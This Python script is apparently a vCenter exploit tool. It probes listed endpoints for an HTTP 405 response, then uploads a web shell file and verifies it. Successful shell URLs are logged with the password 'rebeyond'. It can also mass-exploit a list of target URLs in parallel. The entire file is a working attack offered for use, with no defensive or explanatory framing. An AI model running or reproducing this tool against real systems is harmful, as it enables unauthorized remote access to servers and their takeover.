import requests
import optparse
import config
import warnings
import os
from concurrent.futures import ProcessPoolExecutor

warnings.filterwarnings("ignore")

def errlog(url,data):
    print("{} Error:{} Error".format(url,data))
    print("{} Error:{}".format(url,data),file=open("error.log","a",encoding="utf-8"))

class Explot():
    def __init__(self):
        self.bugcode=config.BUGCODE
        self.bugurllist=config.BUGURL
        self.payload=config.PAYLOAD
        self.timeout=config.TIMEOUT
        self.headers=config.HEADER
        self.uploadsucess=config.UPLOADSUCESS

    def checkbug(self,checkurl):
        checkurl=checkurl.rstrip("/")
        for path in self.bugurllist:
            burl=checkurl+path
            try:
                rqt=requests.get(url=burl,headers=self.headers,verify=False,timeout=self.timeout)
                if(rqt.status_code==405):
                    print("[*] bugur found {}".format(path))
                    return checkurl+path
            except Exception as error:
                errlog(checkurl,error)


    def uploadshell(self,url="",bugurl="",exp=""):
        if(isinstance(url,list)):
            exp=url[2]
            bugurl=url[1]
            url=url[0]

        exppath=exp["exppath"]
        shellurl=url.rstrip("/")+exp["shellurl"]
        file = {'uploadFile': open(exppath, 'rb')}
        try:
            rqt=requests.post(url=bugurl,headers=self.headers,files=file,verify=False,timeout=self.timeout,proxies={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"})
            if(rqt.text in self.uploadsucess):
                print("[*] upload shell sucess")
                rqt2=requests.get(url=shellurl,headers=self.headers,verify=False,timeout=self.timeout)
                if(rqt2.status_code==200):
                    print("[+] getshell sucess,shellurl:{} pass:rebeyond".format(shellurl))
                    print("[+] getshell sucess,shellurl:{} pass:rebeyond".format(shellurl),file=open("shellurl.txt","a",encoding="utf-8"))
                else:
                    print("[-] shellurl:{} not found".format(shellurl))
        except Exception as error:
            errlog(url, error)


if __name__ == '__main__':
    exp=Explot()
    version=config.PAYLOAD.keys()
    parser=optparse.OptionParser()
    parser.add_option('-u',dest='url',help='remote url')
    parser.add_option('-v',dest='version',help='vCenter version,version exp list:{}'.format(",".join(list(version))))
    parser.add_option('-f',dest='file',help='file')
    option,args=parser.parse_args()
    if(option.url and option.version):
        r_version=option.version
        r_url=option.url
        if(r_version in version):
            bugurl=exp.checkbug(option.url)
            if(bugurl!=None):
                exp.uploadshell(r_url,bugurl,exp.payload[r_version])
            else:
                print('[-] checkurl {} Not Found bugurl'.format(r_url))
        else:
            print("[-] Not Version Exploit")
    elif (option.version and option.file):
        r_file=option.file
        r_version=option.version
        if(os.path.exists(r_file)):
            urlist=open(r_file,"r",encoding="utf-8").read().split("\n")
            tmp=[]
            if (r_version in version):
                for url in urlist:
                    for v in config.BUGURL:
                        tmp.append([url, url.rstrip("/") + v, exp.payload[r_version]])


                with ProcessPoolExecutor(max_workers=config.PROCESSNUMBER) as execute:
                    tmp.append(exp.payload[r_version])
                    execute.map(exp.uploadshell,tmp,chunksize=6)
    else:
        parser.print_help()
        print("python exp.py -u <url> -v <version>")
        print("python exp.py -f <file> -v <version>")